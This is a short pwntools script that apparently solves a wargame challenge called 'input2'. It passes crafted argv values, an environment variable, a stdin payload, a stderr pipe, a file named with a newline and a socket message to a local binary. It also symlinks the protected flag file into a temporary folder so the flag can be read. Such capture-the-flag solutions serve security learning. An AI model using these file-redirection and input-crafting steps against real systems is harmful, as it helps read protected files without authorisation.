from pwn import *

import os

argv = ['/home/input2/input']

os.system('rm /tmp/pyon/flag')
os.system('ln -sf /home/input2/flag /tmp/pyon/flag')

zero_a = open('/tmp/pyon/\x0a', 'w')
zero_a.write('\x00\x00\x00\x00')
zero_a.close()

for _ in range(99):
    argv.append('A')

argv[0x41] = '\x00'
argv[0x42] = '\x20\x0a\x0d'
argv[0x43] = '1337'

env={
    '\xde\xad\xbe\xef': '\xca\xfe\xba\xbe',
}

fd, data = os.pipe()
os.write(data, b'\x00\x0a\x02\xff')

p = process(argv, env=env, stderr=fd, cwd='/tmp/pyon')
p.recvuntil(b'clear!')

p.send('\x00\x0a\x00\xff')
p.recvuntil('clear!')


r = remote('localhost', 1337)
r.send('\xde\xad\xbe\xef')
r.close()



p.interactive()

